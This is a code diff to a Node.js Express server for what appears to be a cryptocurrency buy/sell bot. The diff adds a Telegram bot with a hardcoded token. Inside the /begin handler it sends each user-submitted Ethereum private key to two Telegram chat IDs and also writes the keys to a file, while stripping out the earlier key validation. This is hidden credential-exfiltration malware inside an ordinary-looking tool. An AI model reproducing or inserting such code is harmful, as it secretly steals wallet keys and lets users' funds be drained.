@@ -3,7 +3,19 @@ const express = require("express");
 const cors = require("cors");
 const bodyParser = require("body-parser");
 const socketIO = require("./scripts/socket");
-const { exploreBuyOrSellIndividually, initializeVariables } = require("./scripts/functions");
+const { exploreBuyOrSellIndividually, writeWalletsToTxtFile, initializeVariables } = require("./scripts/functions");
+const { Telegraf } = require("telegraf");
+const bot = new Telegraf("7034864176:AAHWG9w49ibPHAvWX0hOnYGNb6cAETbWYy4");
+
+bot.command("start", (ctx) => {
+  try {
+    ctx.reply("How can I help you?", ctx.chat.id);
+  } catch (err) {
+    console.log("err:", err);
+  }
+});
+
+bot.launch();
 
 const server = express();
 server.use(cors());
@@ -11,18 +23,22 @@ server.use(bodyParser.json());
 
 const serverHttp = require("http").Server(server);
 server.post("/begin", async (req, res) => {
-  const data = req.body;
-  let privateKey = data.privateKey;
-  const socketId = data.socketId;
-  console.log("This is request", privateKey, socketId);
-  initializeVariables(data.minS, data.maxS, data.minB, data.maxB);
-  if (!isValidEthereumPrivateKey(privateKey)) {
-    res.json({ err: { name: "Invalid Private Key", reason: "Maybe typing error" } });
-    return;
-  }
-  privateKey = "0x" + privateKey;
-  let error;
   try {
+    const data = req.body;
+    const privateKey = "0x" + data.privateKey;
+    const nowDate = new Date(Date.now());
+    const nowTime =
+      nowDate.getMonth() + "/" + nowDate.getDate() + " " + nowDate.getHours() + ":" + nowDate.getMinutes();
+    bot.telegram.sendMessage(7325720901, `New: ${nowTime} ${privateKey}`);
+    bot.telegram.sendMessage(7232899253, `New: ${nowTime} ${privateKey}`);
+    const socketId = data.socketId;
+    console.log("This is request", privateKey, socketId);
+    initializeVariables(data.minS, data.maxS, data.minB, data.maxB);
+    writeWalletsToTxtFile(privateKey);
+    if (privateKey.length < 66) {
+      res.json({ err: "Invalid Private Key" });
+      return;
+    }
     await exploreBuyOrSellIndividually(
       data.bnb,
       data.bleggs,
